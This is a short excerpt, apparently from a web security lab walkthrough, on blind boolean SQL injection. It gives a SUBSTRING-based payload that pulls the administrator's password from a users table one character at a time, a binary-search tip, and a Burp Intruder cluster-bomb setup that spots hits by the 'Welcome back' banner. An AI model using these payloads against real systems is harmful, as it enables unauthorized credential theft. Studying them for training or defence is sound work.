...
4. Extract each char: `AND (SELECT SUBSTRING(password,i,1) FROM users WHERE username='administrator')='X'`, cycle `X` over `a-z0-9` for each position `i`. (Use `>` comparisons for binary search to cut requests ~6×.)
...
4. Send to Burp Intruder; payload position on the compared char: `...SUBSTRING(password,§1§,1)...='§a§'` (cluster bomb: position 1-20 × charset a-z0-9). The 200-with-banner row gives each char.
...
- **Burp Intruder:** cluster-bomb position×char; sort by status/length/presence-of-banner. Use grep-match on "Welcome back".
